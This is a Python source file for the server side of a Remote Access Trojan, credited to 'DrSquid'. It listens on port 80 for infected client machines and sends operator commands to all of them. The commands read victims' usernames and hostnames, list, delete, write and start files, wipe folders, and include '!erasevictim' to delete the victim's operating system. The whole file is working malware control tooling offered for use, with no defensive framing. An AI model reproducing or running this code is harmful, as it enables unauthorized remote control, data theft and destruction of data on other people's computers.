import socket, os, threading
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = '0.0.0.0'
port = 80
s.bind((ip, port))
connections = []
ready = False
conn_ips = []
def connect():
    while True:
        global ready
        if ready:
            s.listen(1)
            conn, ip = s.accept()
            if ip[0] in conn_ips:
                print(f"\n[+] Another Connection from {ip} has connected to the RAT Server.")
            else:
                print(f"\n[+] {ip} has connected the the RAT Server.")
                conn_ips.append(ip[0])
                connections.append(conn)
def recv():
    while True:
        for connection in connections:
            try:
                conn = connection
                message = conn.recv(10240)
                message = message.decode()
                if message.strip() == "":
                    pass
                else:
                    print(f"\n[+] Message from Conn {conn}: {message}")
            except:
                pass
def instruct():
    global ready
    print(" _____         _______    _____                            ___    ___  ")
    print("|  __ \     /\|__   __|  / ____|                          |__ \  / _ \ ")
    print("| |__) |   /  \  | |    | (___   ___ _ ____   _____ _ __     ) || | | |")
    print("|  _  /   / /\ \ | |     \___ \ / _ \ '__\ \ / / _ \ '__|   / / | | | |")
    print("| | \ \  / ____ \| |     ____) |  __/ |   \ V /  __/ |     / /_ | |_| |")
    print("|_|  \_\/_/    \_\_|    |_____/ \___|_|    \_/ \___|_|    |____(_)___/ ")
    print("Script By DrSquid")
    print("")
    print("This is a server for controlling Computers infected by the client-side Remote Access Trojan.")
    print("")
    print(f"[+] Server Hosted On Device: {socket.gethostname()}")
    print(f"[+] Server Hosted On IP: {ip}, {socket.gethostbyname(socket.gethostname())}")
    print(f"[+] Server Hosted On Port: {port}")
    print("")
    print("[+] Commands List:")
    print("")
    print("[+] !getusername - Gets the Username of the computers")
    print("[+] !getvictimhost - Gets the name of the computers")
    print("[+] !getvictimcwd - Gets the current working directory of the victims computer")
    print("[+] !changedir - Change the Current working directory of the computer")
    print("[+] !listdir - Lists all the files in the Victims working directory")
    print("[+] !erasevictim - Delete the OS of the victims computer")
    print("[+] !delfile <file> - Deletes a file in the directory")
    print("[+] !wipefolder <folder> - Wipes all of the files in the current directory(changing it is suggested)")
    print("[+] !openfile <filename> - Opens a File in Text editor mode(only 1 word filenames)")
    print("[+] !startfile <filename> - Starts a file(only one word filenames)")
    print("[+] !delfile <filename> - Deletes a file in the working directory(only 1 word filenames)")
    print("[+] !getos - Gets the operating system of the victim computer")
    print("[+] !listips - Lists all connected IPs to the server")
    ready = True
    while True:
        try:
            instruction = input("\n[+] Enter an Instruction: ")
            instruction = instruction.encode()
            if instruction.lower().decode().startswith('!openfile'):
                for connection in connections:
                    try:
                        conn = connection
                        conn.send(instruction)
                    except:
                        print(f"[+] Connection from {conn} had closed.")
                        conn.close()
                while True:
                    try:
                        line_to_write = input("[+] Enter a the line to write in the file: ")
                        if line_to_write.lower().startswith('!stop'):
                            break
                        elif line_to_write.lower().startswith('!viewlines'):
                            pass
                        for connection in connections:
                            line_to_write = line_to_write.encode()
                            try:
                                conn = connection
                                conn.send(line_to_write)
                            except:
                                print(f"[+] Connection from {conn} had closed.")
                                conn.close()
                    except:
                        print("[+] There was an error.")
            elif instruction.decode().lower().startswith('!listips'):
                print(f"[+] List of IPs: {conn_ips}")
            for connection in connections:
                try:
                    conn = connection
                    conn.send(instruction)
                except:
                    print(f"[+] Connection from {conn} had closed.")
                    conn.close()
        except:
            pass
listener = threading.Thread(target=connect)
listener.start()
reciever = threading.Thread(target=recv)
reciever.start()
instructor = threading.Thread(target=instruct)
instructor.start()
